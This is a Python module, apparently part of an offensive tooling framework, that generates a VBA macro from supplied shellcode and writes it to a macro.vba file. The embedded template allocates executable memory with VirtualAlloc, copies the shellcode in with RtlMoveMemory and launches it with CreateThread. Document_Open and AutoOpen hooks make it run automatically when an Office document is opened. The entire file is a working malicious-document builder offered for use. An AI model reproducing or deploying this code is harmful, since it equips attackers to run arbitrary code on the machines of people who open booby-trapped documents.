import os
from ..core.utils import console, format_vba_shellcode

TEMPLATE = """
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ByVal ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Byte
    Dim res As LongPtr
    Dim tid As Long
    
    buf = Array({shellcode})

    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = CByte(buf(counter))
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, tid)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

def generate(shellcode, output_dir):
    vba_formatted = format_vba_shellcode(shellcode)
    output = TEMPLATE.format(shellcode=vba_formatted)
    
    output_file = os.path.join(output_dir, "macro.vba")
    with open(output_file, "w") as f:
        f.write(output)
        
    console.print(f"[bold green][+] Success! VBA Classic Macro saved to: [bold white]{output_file}[/bold white][/bold green]")
    return output_file
